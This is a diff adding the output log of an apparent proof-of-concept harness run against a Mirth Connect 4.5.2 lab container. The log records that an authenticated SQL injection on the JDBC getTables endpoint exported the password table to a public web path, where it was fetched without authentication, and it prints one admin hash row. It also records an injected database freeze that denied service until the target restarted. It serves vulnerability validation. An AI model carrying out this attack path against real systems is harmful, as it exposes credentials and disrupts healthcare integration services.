@@ -1,0 +1,24 @@
+target_ready=true
+target_image=nextgenhealthcare/connect:4.5.2@sha256:4afa295cfe7c5ffd596efee69594157fea87202e33d66bb4a98a52db4598f836
+target_image_id=sha256:4afa295cfe7c5ffd596efee69594157fea87202e33d66bb4a98a52db4598f836 target_repo_digests=["nextgenhealthcare/connect@sha256:4afa295cfe7c5ffd596efee69594157fea87202e33d66bb4a98a52db4598f836"]
+target_version=4.5.2 target_container=mirth-poc-target-20260908T191111Z-18165-12887 lab_network=mirth-poc-20260908T191111Z-18165-12887
+database_api_baseline_status=200
+vulnerable_endpoint=/api/connectors/jdbc/_getTables
+database_url=jdbc:derby:/opt/connect/appdata/mirthdb
+export_path=/opt/connect/public_html/mirth-poc-8dbb04e6284d4be59a6c87e47bc18737.csv
+injection_http_status=200
+unauthenticated_fetch_status=200
+"admin","b8cA3mDkavInMc2JBYa6/C3EGxDp7ppqh7FsoXx0x8+3LWK3Ed3ELg==","2026-09-08 19:11:16.967"
+PASS: authenticated SQL injection exported the password table and the result was fetched without authentication
+freeze_request=timed_out
+non_database_api_status=200
+database_api_post_freeze_attempt_1=timed_out
+database_api_post_freeze_attempt_2=timed_out
+database_api_post_freeze_attempt_3=timed_out
+unfreeze_via_injection=timed_out_before_call_could_complete
+database_api_after_unfreeze_attempt=timed_out
+PASS: injected SYSCS_FREEZE_DATABASE persistently denied DB-backed operations; restart recovery remains to be checked by the harness
+target_restart=begin
+target_ready=true
+database_api_post_restart_status=200
+PASS: target restart restored DB-backed API availability
